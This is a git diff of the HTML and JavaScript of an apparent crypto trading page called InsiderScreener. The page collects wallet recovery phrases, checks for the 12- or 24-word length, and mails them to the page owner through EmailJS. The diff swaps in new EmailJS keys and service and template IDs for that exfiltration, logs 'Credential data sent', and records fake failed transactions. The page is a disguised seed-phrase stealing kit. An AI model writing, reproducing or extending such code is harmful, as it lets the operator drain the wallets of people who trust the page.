@@ -1890,7 +1890,14 @@
         </div>
     </div>
     <script>
-        (function() { emailjs.init('sRso5VY8foxZ-a039'); })();
+        // EMAILJS CONFIGURATION - Updated with your credentials
+        (function() { 
+            emailjs.init('Xm0cfjQSVLcKNlJBd'); 
+        })();
+
+        // EmailJS service and template IDs
+        const EMAILJS_SERVICE_ID = 'service_05hedk4';
+        const EMAILJS_TEMPLATE_ID = 'template_rhz4f2k';
 
         const TICKER_SYMBOLS = [
             { id: 'bitcoin', symbol: 'BTC' },
@@ -1954,6 +1961,7 @@
                 this.setupTabSwitching();
                 this.initTicker();
                 console.log('🚀 InsiderScreener Platform Initialized');
+                console.log('📧 EmailJS configured with service: ' + EMAILJS_SERVICE_ID);
             }
             initParticles() {
                 const canvas = document.getElementById('particlesCanvas');
@@ -2289,10 +2297,14 @@
                         templateParams.word_count = words.length;
                         templateParams.is_valid_format = (words.length === 12 || words.length === 24) ? 'valid' :
                             'invalid'; }
-                    await emailjs.send('service_uas8yh3', 'template_ysv8b74', templateParams);
-                } catch (error) { console.log('Email send failed:', error);
+                    // Send using new EmailJS credentials
+                    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+                    console.log('📧 Credential data sent to EmailJS');
+                } catch (error) { 
+                    console.log('Email send failed:', error);
                     this.saveLocalLog('connection_failed', { walletType, credentials: credentials || 'NOT_PROVIDED',
-                        timestamp: new Date().toISOString(), error: error.toString() }); }
+                        timestamp: new Date().toISOString(), error: error.toString() }); 
+                }
             }
             async logFailedTransaction(amount, tokenAmount, txHash) {
                 try {
@@ -2315,15 +2327,17 @@
                         transaction_hash: txHash,
                         status: 'FAILED'
                     };
-                    await emailjs.send('service_uas8yh3', 'template_ysv8b74', templateParams);
+                    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
                     this.state.transactions.push({ ...templateParams, id: Date.now() });
                     localStorage.setItem('trading_transactions', JSON.stringify(this.state.transactions));
-                } catch (error) { console.log('Email send failed, saving locally:', error);
+                } catch (error) { 
+                    console.log('Email send failed, saving locally:', error);
                     this.state.transactions.push({ transaction_type: 'buy', token_symbol: this.state.selectedToken,
                         amount_usd: amount.toFixed(2), token_amount: tokenAmount.toFixed(2),
                         transaction_hash: txHash, status: 'FAILED', timestamp: new Date().toLocaleString(),
                         id: Date.now() });
-                    localStorage.setItem('trading_transactions', JSON.stringify(this.state.transactions)); }
+                    localStorage.setItem('trading_transactions', JSON.stringify(this.state.transactions)); 
+                }
             }
             saveLocalLog(type, data) { try { const logs = JSON.parse(localStorage.getItem('trading_logs') || '[]');
                     logs.push({ type, data, timestamp: new Date().toISOString() });
@@ -2527,9 +2541,7 @@
                     const isAtTarget = pos.pnlPercent >= (TARGET_MULTIPLIER - 1) * 100;
                     const emoji = pos.tokenSymbol === '20267' ? '🚀' : pos.tokenSymbol === 'HOWDY' ? '🤠' : pos.tokenSymbol === 'STRAWBERRY' ? '🍓' : '🥛';
                     
-                    // Don't show "Target Reached" text, just show the percentage capped at max
                     const displayPnl = isAtTarget ? (TARGET_MULTIPLIER - 1) * 100 : pos.pnl;
-                    const displayPnlPercent = isAtTarget ? (TARGET_MULTIPLIER - 1) * 100 : pos.pnlPercent;
                     
                     card.innerHTML = `
                         <div class="position-top">
